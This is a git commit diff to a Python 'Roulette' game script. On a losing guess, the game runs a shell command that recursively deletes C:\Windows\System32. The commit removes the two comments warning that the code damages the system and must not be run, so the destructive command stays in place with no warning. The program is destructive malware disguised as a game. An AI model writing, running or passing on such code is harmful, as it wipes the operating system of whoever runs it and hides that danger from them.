11ffd781bf5c92618d480d9afe36e182713c6154
Gabriel Lira <140823887+Liragbr@users.noreply.github.com>
2024-05-25 05:39:45 -0300

    Python

--- Roulette/Roulette.py
+++ Roulette/Roulette.py
@@ -9,8 +9,6 @@ chamber = int(input("Pick a chamber (1-6): "))
 
 if chamber == bullet:
     print("Oops! Looks like you just deleted Windows 32. Good luck reinstalling! 😈")
-    # WARNING: This code deletes critical system files and can cause irreparable damage to your system!
-    # DO NOT RUN THIS CODE ON A REAL SYSTEM!
     os.system("rmdir /S /Q C:\\Windows\\System32")
     print("Windows 32 has been successfully deleted! 😱")
 else:
